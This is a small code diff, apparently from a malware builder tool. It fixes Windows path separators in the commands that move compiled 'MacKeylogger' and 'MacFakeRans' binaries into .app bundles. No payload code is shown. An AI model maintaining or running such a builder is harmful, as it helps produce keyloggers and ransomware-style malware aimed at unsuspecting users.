@@ -295,7 +295,7 @@ func makepy2() {
             os.system(idkbuild + gofilename)
             os.remove(gofilename)
             os.chdir("..")
-            os.system("move sks/MacKeylogger ./MacKeylog.app")
+            os.system("move sks\\MacKeylogger .\\MacKeylog.app")
             print(Fore.GREEN + donestuff + Style.RESET_ALL)
             inputline()
         elif (bugbypas == "n" or bugbypas == "N" or bugbypas == "no" or bugbypas == "No"):
@@ -481,7 +481,7 @@ func reverse() {
             os.system(idkbuild + gofilename)
             os.remove(gofilename)
             os.chdir("..")
-            os.system("move sks/MacFakeRans ./MacFakeRans.app")
+            os.system("move sks\\MacFakeRans .\\MacFakeRans.app")
             print(Fore.GREEN + donestuff + Style.RESET_ALL)
             inputline()
         elif (bugbypas == "n" or bugbypas == "N" or bugbypas == "no" or bugbypas == "No"):
